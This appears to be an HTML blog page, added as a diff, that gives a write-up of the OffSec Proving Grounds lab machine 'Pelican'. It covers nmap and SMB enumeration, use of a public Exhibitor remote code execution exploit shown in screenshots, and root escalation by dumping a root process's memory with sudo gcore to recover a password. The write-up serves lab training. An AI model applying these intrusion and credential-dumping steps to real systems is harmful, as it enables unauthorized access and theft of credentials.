@@ -1,0 +1,364 @@
+<!DOCTYPE html>
+<html lang="en-us"><head><meta charset="utf-8">
+<meta http-equiv="content-type" content="text/html">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+
+<title itemprop="name">Writeup - Offsec PG Pelican | kei5uke&#39;s Hacking Note</title>
+<meta property="og:title" content="Writeup - Offsec PG Pelican | kei5uke&#39;s Hacking Note" />
+<meta name="twitter:title" content="Writeup - Offsec PG Pelican | kei5uke&#39;s Hacking Note" />
+<meta itemprop="name" content="Writeup - Offsec PG Pelican | kei5uke&#39;s Hacking Note" />
+<meta name="application-name" content="Writeup - Offsec PG Pelican | kei5uke&#39;s Hacking Note" />
+<meta property="og:site_name" content="kei5uke&#39;s Hacking Note" />
+
+<meta name="description" content="Writeup for PG Pelican">
+<meta itemprop="description" content="Writeup for PG Pelican" />
+<meta property="og:description" content="Writeup for PG Pelican" />
+<meta name="twitter:description" content="Writeup for PG Pelican" />
+
+<meta property="og:locale" content="en-us" />
+<meta name="language" content="en-us" />
+
+
+
+  <meta itemprop="image" content="" />
+  <meta property="og:image" content="" />
+  <meta name="twitter:image" content="" />
+  <meta name="twitter:image:src" content="" />
+
+
+
+
+    
+    
+    
+    
+
+    <meta property="og:type" content="article" />
+    <meta property="og:article:published_time" content=2023-10-02T00:00:00Z />
+    <meta property="article:published_time" content=2023-10-02T00:00:00Z />
+
+    
+    <meta property="og:article:author" content="Kei5uke" />
+    <meta property="article:author" content="Kei5uke" />
+    <meta name="author" content="Kei5uke" />
+    
+
+    
+
+    <script defer type="application/ld+json">
+    {
+        "@context": "http://schema.org",
+        "@type": "Article",
+        "headline": "Writeup - Offsec PG Pelican",
+        "author": {
+        "@type": "Person",
+        "name": ""
+        },
+        "datePublished": "2023-10-02",
+        "description": "Writeup for PG Pelican",
+        "wordCount":  645 ,
+        "mainEntityOfPage": "True",
+        "dateModified": "2023-10-02",
+        "image": {
+        "@type": "imageObject",
+        "url": ""
+        },
+        "publisher": {
+        "@type": "Organization",
+        "name": "kei5uke\u0027s Hacking Note"
+        }
+    }
+    </script>
+
+
+<meta name="generator" content="Hugo 0.118.2">
+
+    
+
+    <link rel="canonical" href="/posts/pelican/">
+    <link href="/style.min.9bd04d0fad85388343088ec85e9afd787ea003e72914d7f57df39c17ab2e7173.css" rel="stylesheet">
+    <link href="/code-highlight.min.706d31975fec544a864cb7f0d847a73ea55ca1df91bf495fd12a177138d807cf.css" rel="stylesheet">
+
+    
+    <link rel="apple-touch-icon" sizes="180x180" href="/icons/apple-touch-icon.png">
+    <link rel="icon" type="image/png" sizes="32x32" href="/icons/favicon-32x32.png">
+    <link rel="icon" type="image/png" sizes="16x16" href="/icons/favicon-16x16.png">
+    <link rel="mask-icon" href="/icons/safari-pinned-tab.svg">
+    <link rel="shortcut icon" href="/favicon.ico">
+
+
+
+
+<link rel="manifest" href="/site.webmanifest">
+
+<meta name="msapplication-config" content="/browserconfig.xml">
+<meta name="msapplication-TileColor" content="#2d89ef">
+<meta name="theme-color" content="#434648">
+
+    
+    <link rel="icon" type="image/svg+xml" href="/icons/favicon.svg">
+
+    
+    </head>
+<body data-theme = "auto" class="notransition">
+
+<script src="/js/theme.min.8961c317c5b88b953fe27525839672c9343f1058ab044696ca225656c8ba2ab0.js" integrity="sha256-iWHDF8W4i5U/4nUlg5ZyyTQ/EFirBEaWyiJWVsi6KrA="></script>
+
+<div class="navbar" role="navigation">
+    <nav class="menu" aria-label="Main Navigation">
+        <a href="/" class="logo">
+            <svg xmlns="http://www.w3.org/2000/svg" width="25" height="25" 
+viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" 
+stroke-linejoin="round" class="feather feather-home">
+<title>Home</title>
+<path d="M3 9l9-7 9 7v11a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2z"></path>
+<polyline points="9 22 9 12 15 12 15 22"></polyline>
+</svg>
+        </a>
+        <input type="checkbox" id="menu-trigger" class="menu-trigger" />
+        <label for="menu-trigger">
+            <span class="menu-icon">
+                <svg xmlns="http://www.w3.org/2000/svg" width="25" height="25" stroke="currentColor" fill="none" viewBox="0 0 14 14"><title>Menu</title><path stroke-linecap="round" stroke-linejoin="round" d="M10.595 7L3.40726 7"></path><path stroke-linecap="round" stroke-linejoin="round" d="M10.5096 3.51488L3.49301 3.51488"></path><path stroke-linecap="round" stroke-linejoin="round" d="M10.5096 10.4851H3.49301"></path><path stroke-linecap="round" stroke-linejoin="round" d="M0.5 12.5V1.5C0.5 0.947715 0.947715 0.5 1.5 0.5H12.5C13.0523 0.5 13.5 0.947715 13.5 1.5V12.5C13.5 13.0523 13.0523 13.5 12.5 13.5H1.5C0.947715 13.5 0.5 13.0523 0.5 12.5Z"></path></svg>
+            </span>
+        </label>
+
+        <div class="trigger">
+            <ul class="trigger-container">
+                
+                
+                <li>
+                    <a class="menu-link " href="/">
+                        Home
+                    </a>
+                    
+                </li>
+                
+                <li>
+                    <a class="menu-link active" href="/posts/">
+                        Posts
+                    </a>
+                    
+                </li>
+                
+                <li>
+                    <a class="menu-link " href="/pages/about/">
+                        About
+                    </a>
+                    
+                </li>
+                
+                <li class="menu-separator">
+                    <span>|</span>
+                </li>
+            </ul>
+            <a id="mode" href="#">
+                <svg xmlns="http://www.w3.org/2000/svg" class="mode-sunny" width="21" height="21" viewBox="0 0 14 14" stroke-width="1">
+<title>LIGHT</title><g><circle cx="7" cy="7" r="2.5" fill="none" stroke-linecap="round" stroke-linejoin="round"></circle><line x1="7" y1="0.5" x2="7" y2="2.5" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="2.4" y1="2.4" x2="3.82" y2="3.82" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="0.5" y1="7" x2="2.5" y2="7" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="2.4" y1="11.6" x2="3.82" y2="10.18" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="7" y1="13.5" x2="7" y2="11.5" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="11.6" y1="11.6" x2="10.18" y2="10.18" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="13.5" y1="7" x2="11.5" y2="7" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="11.6" y1="2.4" x2="10.18" y2="3.82" fill="none" stroke-linecap="round" stroke-linejoin="round"></line></g></svg>
+                <svg xmlns="http://www.w3.org/2000/svg" class="mode-moon" width="21" height="21" viewBox="0 0 14 14" stroke-width="1">
+<title>DARK</title><g><circle cx="7" cy="7" r="2.5" fill="none" stroke-linecap="round" stroke-linejoin="round"></circle><line x1="7" y1="0.5" x2="7" y2="2.5" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="2.4" y1="2.4" x2="3.82" y2="3.82" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="0.5" y1="7" x2="2.5" y2="7" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="2.4" y1="11.6" x2="3.82" y2="10.18" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="7" y1="13.5" x2="7" y2="11.5" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="11.6" y1="11.6" x2="10.18" y2="10.18" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="13.5" y1="7" x2="11.5" y2="7" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="11.6" y1="2.4" x2="10.18" y2="3.82" fill="none" stroke-linecap="round" stroke-linejoin="round"></line></g></svg>
+            </a>
+        </div>
+    </nav>
+</div>
+
+<div class="wrapper post">
+    <main class="page-content" aria-label="Content">
+        <article>
+            <header class="header">
+                <h1 class="header-title">Writeup - Offsec PG Pelican</h1>
+                
+                
+                <div class="post-meta">
+                    <time datetime="2023-10-02T00:00:00&#43;00:00" itemprop="datePublished"> 2 Oct 2023 </time>
+                </div>
+                
+            </header>
+                <details class="toc">
+                    <summary><b>Table of Contents</b></summary>
+                    <nav id="TableOfContents">
+  <ul>
+    <li><a href="#pelican">Pelican</a></li>
+    <li><a href="#enumeration-with-nmap"><strong>Enumeration with Nmap</strong></a></li>
+    <li><a href="#enumerate-smb">Enumerate SMB</a></li>
+    <li><a href="#enumerate-http-8080">Enumerate HTTP (8080)</a></li>
+    <li><a href="#exploit-the-service">Exploit the Service</a></li>
+    <li><a href="#low-privilege-shell">Low Privilege Shell</a></li>
+    <li><a href="#privilege-escalation">Privilege Escalation</a></li>
+    <li><a href="#summary">Summary</a></li>
+  </ul>
+</nav>
+                </details>
+                <div class="page-content">
+                <h1 id="pelican">Pelican</h1>
+<h1 id="enumeration-with-nmap"><strong>Enumeration with Nmap</strong></h1>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">┌──<span class="o">(</span>root💀kali<span class="o">)</span>-<span class="o">[</span>~/perican<span class="o">]</span>
+</span></span><span class="line"><span class="cl">└─# nmap -p- -sC -sV 192.168.246.98 -T4 -oN nmap.out
+</span></span><span class="line"><span class="cl">Starting Nmap 7.94 <span class="o">(</span> https://nmap.org <span class="o">)</span> at 2023-10-02 01:05 EEST
+</span></span><span class="line"><span class="cl">Warning: 192.168.246.98 giving up on port because retransmission cap hit <span class="o">(</span>6<span class="o">)</span>.
+</span></span><span class="line"><span class="cl">Stats: 0:09:51 elapsed<span class="p">;</span> <span class="m">0</span> hosts completed <span class="o">(</span><span class="m">1</span> up<span class="o">)</span>, <span class="m">1</span> undergoing Service Scan
+</span></span><span class="line"><span class="cl">Service scan Timing: About 88.89% <span class="k">done</span><span class="p">;</span> ETC: 01:15 <span class="o">(</span>0:00:02 remaining<span class="o">)</span>
+</span></span><span class="line"><span class="cl">Nmap scan report <span class="k">for</span> 192.168.246.98
+</span></span><span class="line"><span class="cl">Host is up <span class="o">(</span>0.047s latency<span class="o">)</span>.
+</span></span><span class="line"><span class="cl">Not shown: <span class="m">65495</span> closed tcp ports <span class="o">(</span>reset<span class="o">)</span>, <span class="m">31</span> filtered tcp ports <span class="o">(</span>no-response<span class="o">)</span>
+</span></span><span class="line"><span class="cl">PORT      STATE SERVICE     VERSION
+</span></span><span class="line"><span class="cl">22/tcp    open  ssh         OpenSSH 7.9p1 Debian 10+deb10u2 <span class="o">(</span>protocol 2.0<span class="o">)</span>
+</span></span><span class="line"><span class="cl"><span class="p">|</span> ssh-hostkey: 
+</span></span><span class="line"><span class="cl"><span class="p">|</span>   <span class="m">2048</span> a8:e1:60:68:be:f5:8e:70:70:54:b4:27:ee:9a:7e:7f <span class="o">(</span>RSA<span class="o">)</span>
+</span></span><span class="line"><span class="cl"><span class="p">|</span>   <span class="m">256</span> bb:99:9a:45:3f:35:0b:b3:49:e6:cf:11:49:87:8d:94 <span class="o">(</span>ECDSA<span class="o">)</span>
+</span></span><span class="line"><span class="cl"><span class="p">|</span>_  <span class="m">256</span> f2:eb:fc:45:d7:e9:80:77:66:a3:93:53:de:00:57:9c <span class="o">(</span>ED25519<span class="o">)</span>
+</span></span><span class="line"><span class="cl">139/tcp   open  netbios-ssn Samba smbd 3.X - 4.X <span class="o">(</span>workgroup: WORKGROUP<span class="o">)</span>
+</span></span><span class="line"><span class="cl">445/tcp   open  Eetbios-ssn Samba smbd 4.9.5-Debian <span class="o">(</span>workgroup: WORKGROUP<span class="o">)</span>
+</span></span><span class="line"><span class="cl">631/tcp   open  ipp         CUPS 2.2
+</span></span><span class="line"><span class="cl"><span class="p">|</span>_http-server-header: CUPS/2.2 IPP/2.1
+</span></span><span class="line"><span class="cl"><span class="p">|</span>_http-title: Forbidden - CUPS v2.2.10
+</span></span><span class="line"><span class="cl"><span class="p">|</span> http-methods: 
+</span></span><span class="line"><span class="cl"><span class="p">|</span>_  Potentially risky methods: PUT
+</span></span><span class="line"><span class="cl">2181/tcp  open  zookeeper   Zookeeper 3.4.6-1569965 <span class="o">(</span>Built on 02/20/2014<span class="o">)</span>
+</span></span><span class="line"><span class="cl">2222/tcp  open  ssh         OpenSSH 7.9p1 Debian 10+deb10u2 <span class="o">(</span>protocol 2.0<span class="o">)</span>
+</span></span><span class="line"><span class="cl"><span class="p">|</span> ssh-hostkey: 
+</span></span><span class="line"><span class="cl"><span class="p">|</span>   <span class="m">2048</span> a8:e1:60:68:be:f5:8e:70:70:54:b4:27:ee:9a:7e:7f <span class="o">(</span>RSA<span class="o">)</span>
+</span></span><span class="line"><span class="cl"><span class="p">|</span>   <span class="m">256</span> bb:99:9a:45:3f:35:0b:b3:49:e6:cf:11:49:87:8d:94 <span class="o">(</span>ECDSA<span class="o">)</span>
+</span></span><span class="line"><span class="cl"><span class="p">|</span>_  <span class="m">256</span> f2:eb:fc:45:d7:e9:80:77:66:a3:93:53:de:00:57:9c <span class="o">(</span>ED25519<span class="o">)</span>
+</span></span><span class="line"><span class="cl">8080/tcp  open  http        Jetty 1.0
+</span></span><span class="line"><span class="cl"><span class="p">|</span>_http-title: Error <span class="m">404</span> Not Found
+</span></span><span class="line"><span class="cl"><span class="p">|</span>_http-server-header: Jetty<span class="o">(</span>1.0<span class="o">)</span>
+</span></span><span class="line"><span class="cl">8081/tcp  open  http        nginx 1.14.2
+</span></span><span class="line"><span class="cl"><span class="p">|</span>_http-server-header: nginx/1.14.2
+</span></span><span class="line"><span class="cl"><span class="p">|</span>_http-title: Did not follow redirect to http://192.168.246.98:8080/exhibitor/v1/ui/index.html
+</span></span><span class="line"><span class="cl">41665/tcp open  java-rmi    Java RMI
+</span></span><span class="line"><span class="cl">Service Info: Host: PELICAN<span class="p">;</span> OS: Linux<span class="p">;</span> CPE: cpe:/o:linux:linux_kernel
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">Host script results:
+</span></span><span class="line"><span class="cl"><span class="p">|</span> smb2-time: 
+</span></span><span class="line"><span class="cl"><span class="p">|</span>   date: 2023-10-01T22:15:28
+</span></span><span class="line"><span class="cl"><span class="p">|</span>_  start_date: N/A
+</span></span><span class="line"><span class="cl"><span class="p">|</span>_clock-skew: mean: 1h20m01s, deviation: 2h18m35s, median: 0s
+</span></span><span class="line"><span class="cl"><span class="p">|</span> smb2-security-mode: 
+</span></span><span class="line"><span class="cl"><span class="p">|</span>   3:1:1: 
+</span></span><span class="line"><span class="cl"><span class="p">|</span>_    Message signing enabled but not required
+</span></span><span class="line"><span class="cl"><span class="p">|</span> smb-os-discovery: 
+</span></span><span class="line"><span class="cl"><span class="p">|</span>   OS: Windows 6.1 <span class="o">(</span>Samba 4.9.5-Debian<span class="o">)</span>
+</span></span><span class="line"><span class="cl"><span class="p">|</span>   Computer name: pelican
+</span></span><span class="line"><span class="cl"><span class="p">|</span>   NetBIOS computer name: PELICAN<span class="se">\x</span><span class="m">00</span>
+</span></span><span class="line"><span class="cl"><span class="p">|</span>   Domain name: <span class="se">\x</span><span class="m">00</span>
+</span></span><span class="line"><span class="cl"><span class="p">|</span>   FQDN: pelican
+</span></span><span class="line"><span class="cl"><span class="p">|</span>_  System time: 2023-10-01T18:15:31-04:00
+</span></span><span class="line"><span class="cl"><span class="p">|</span> smb-security-mode: 
+</span></span><span class="line"><span class="cl"><span class="p">|</span>   account_used: guest
+</span></span><span class="line"><span class="cl"><span class="p">|</span>   authentication_level: user
+</span></span><span class="line"><span class="cl"><span class="p">|</span>   challenge_response: supported
+</span></span><span class="line"><span class="cl"><span class="p">|</span>_  message_signing: disabled <span class="o">(</span>dangerous, but default<span class="o">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+</span></span><span class="line"><span class="cl">Nmap <span class="k">done</span>: <span class="m">1</span> IP address <span class="o">(</span><span class="m">1</span> host up<span class="o">)</span> scanned in 600.31 seconds
+</span></span></code></pre></div><h1 id="enumerate-smb">Enumerate SMB</h1>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">┌──<span class="o">(</span>root💀kali<span class="o">)</span>-<span class="o">[</span>~<span class="o">]</span>
+</span></span><span class="line"><span class="cl">└─# smbclient <span class="se">\\\\</span>192.168.246.98<span class="se">\\</span>IPC$                                                                                   <span class="m">1</span> ⨯
+</span></span><span class="line"><span class="cl">Password <span class="k">for</span> <span class="o">[</span>WORKGROUP<span class="se">\r</span>oot<span class="o">]</span>:
+</span></span><span class="line"><span class="cl">Try <span class="s2">&#34;help&#34;</span> to get a list of possible commands.
+</span></span><span class="line"><span class="cl">smb: <span class="se">\&gt;</span> dir
+</span></span><span class="line"><span class="cl">NT_STATUS_OBJECT_NAME_NOT_FOUND listing <span class="se">\*</span>
+</span></span></code></pre></div><p>No interesting findings in SMB.</p>
+<h1 id="enumerate-http-8080">Enumerate HTTP (8080)</h1>
+<p><img src="Pelican%20cc5be9ecb14f4241b87f5ab19c417ad7/Screenshot_2023-10-02_at_01.26.03.png" alt="Screenshot 2023-10-02 at 01.26.03.png"></p>
+<h1 id="exploit-the-service">Exploit the Service</h1>
+<p>I searched for an exploit for Exhibitor for Zookeeper and found an interesting note.</p>
+<p><a href="https://www.exploit-db.com/exploits/48654">Exhibitor Web UI 1.7.1 - Remote Code Execution</a></p>
+<p><img src="Pelican%20cc5be9ecb14f4241b87f5ab19c417ad7/Screenshot_2023-10-02_at_02.19.01.png" alt="Screenshot 2023-10-02 at 02.19.01.png"></p>
+<p>I added the necessary part in the java.env script and committed the setting.</p>
+<p><img src="Pelican%20cc5be9ecb14f4241b87f5ab19c417ad7/Screenshot_2023-10-02_at_02.19.21.png" alt="Screenshot 2023-10-02 at 02.19.21.png"></p>
+<h1 id="low-privilege-shell">Low Privilege Shell</h1>
+<p><img src="Pelican%20cc5be9ecb14f4241b87f5ab19c417ad7/Screenshot_2023-10-02_at_02.34.36.png" alt="Screenshot 2023-10-02 at 02.34.36.png"></p>
+<p>I successfully obtained the shell.</p>
+<h1 id="privilege-escalation">Privilege Escalation</h1>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">charles@pelican:/opt/zookeeper$ sudo -l
+</span></span><span class="line"><span class="cl">sudo -l
+</span></span><span class="line"><span class="cl">Matching Defaults entries <span class="k">for</span> charles on pelican:
+</span></span><span class="line"><span class="cl">    env_reset, mail_badpass,
+</span></span><span class="line"><span class="cl">    <span class="nv">secure_path</span><span class="o">=</span>/usr/local/sbin<span class="se">\:</span>/usr/local/bin<span class="se">\:</span>/usr/sbin<span class="se">\:</span>/usr/bin<span class="se">\:</span>/sbin<span class="se">\:</span>/bin
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">User charles may run the following commands on pelican:
+</span></span><span class="line"><span class="cl">    <span class="o">(</span>ALL<span class="o">)</span> NOPASSWD: /usr/bin/gcore
+</span></span></code></pre></div><p>The command <code>/usr/bin/gcore</code> is allowed to run as root apparently.</p>
+<p><a href="https://gtfobins.github.io/gtfobins/gcore/">gcore - GTFOBins</a></p>
+<p>The gcore command generates a core file (dump file) of a running process. It can be used to retrieve sensitive information if the process is run by root.<br>
+It can be a way to retrieve sensitive information if the process is run by root.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">root       <span class="m">527</span>  0.0  0.0   <span class="m">2276</span>    <span class="m">72</span> ?        Ss   18:02   0:00 /usr/bin/password-store
+</span></span></code></pre></div><p>I found an interesting process:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">sudo /usr/bin/gcore <span class="m">527</span>
+</span></span></code></pre></div><p>I got the dump.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">charles@pelican:~$ strings core.527
+</span></span><span class="line"><span class="cl">strings core.527
+</span></span><span class="line"><span class="cl">CORE
+</span></span><span class="line"><span class="cl">password-store
+</span></span><span class="line"><span class="cl">/usr/bin/password-store 
+</span></span><span class="line"><span class="cl">CORE
+</span></span><span class="line"><span class="cl">CORE
+</span></span><span class="line"><span class="cl">/usr/bin/passwor
+</span></span><span class="line"><span class="cl">////////////////
+</span></span><span class="line"><span class="cl">LINUX
+</span></span><span class="line"><span class="cl">...
+</span></span></code></pre></div><p>I analyzed the strings.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="m">001</span> Password: root:
+</span></span><span class="line"><span class="cl">ClogKingpinInning731
+</span></span></code></pre></div><p>I found interesting text. It could be the root password.</p>
+<p><img src="Pelican%20cc5be9ecb14f4241b87f5ab19c417ad7/Screenshot_2023-10-02_at_02.45.22.png" alt="Screenshot 2023-10-02 at 02.45.22.png"></p>
+<p><code>sudo su root -p</code>  and paste the password and got the root shell.</p>
+<h1 id="summary">Summary</h1>
+<p>After a hiatus from Linux CTF challenges, diving into this one brought back the familiar rush. Unraveling the pathway to obtaining a shell was a bit of a work, yet the vulnerability turned out to be right under my nose, hidden in plain sight on the web page.</p>
+<p>In the initial stages, I overlooked some crucial information simply because the vulnerability version didn&rsquo;t match up. This served as a powerful reminder to always be vigilant and meticulous in scrutinizing every detail. It&rsquo;s a testament to the fact that sometimes, the most critical clues can be hiding in unexpected places.</p>
+
+            </div>
+        </article></main>
+</div>
+<footer class="footer">
+    <span class="footer_item"> </span>
+    &nbsp;
+
+    <div class="footer_social-icons">
+<a href="https://github.com/kei5uke" target="_blank" rel="noopener noreferrer me"
+    title="Github">
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"
+    stroke-linecap="round" stroke-linejoin="round">
+    <path
+        d="M9 19c-5 1.5-5-2.5-7-3m14 6v-3.87a3.37 3.37 0 0 0-.94-2.61c3.14-.35 6.44-1.54 6.44-7A5.44 5.44 0 0 0 20 4.77 5.07 5.07 0 0 0 19.91 1S18.73.65 16 2.48a13.38 13.38 0 0 0-7 0C6.27.65 5.09 1 5.09 1A5.07 5.07 0 0 0 5 4.77a5.44 5.44 0 0 0-1.5 3.78c0 5.42 3.3 6.61 6.44 7A3.37 3.37 0 0 0 9 18.13V22">
+    </path>
+</svg>
+</a>
+</div>
+    <small class="footer_copyright">
+        © 2023 kei5uke.
+        Powered by <a href="https://github.com/hugo-sid/hugo-blog-awesome" target="_blank"  rel="noopener">Hugo blog awesome</a>.
+    </small>
+</footer><a href="#" title="Go to top" id="totop">
+    <svg xmlns="http://www.w3.org/2000/svg" width="48" height="48" fill="currentColor" stroke="currentColor" viewBox="0 96 960 960">
+    <path d="M283 704.739 234.261 656 480 410.261 725.739 656 677 704.739l-197-197-197 197Z"/>
+</svg>
+
+</a>
+
+
+    
+
+
+
+
+    
+    
+        
+    
+
+    
+    
+        
+    
+
+
+
+    
+    <script src="/js/main.min.35f435a5d8eac613c52daa28d8af544a4512337d3e95236e4a4978417b8dcb2f.js" integrity="sha256-NfQ1pdjqxhPFLaoo2K9USkUSM30&#43;lSNuSkl4QXuNyy8="></script>
+
+    
+
+</body>
+</html>
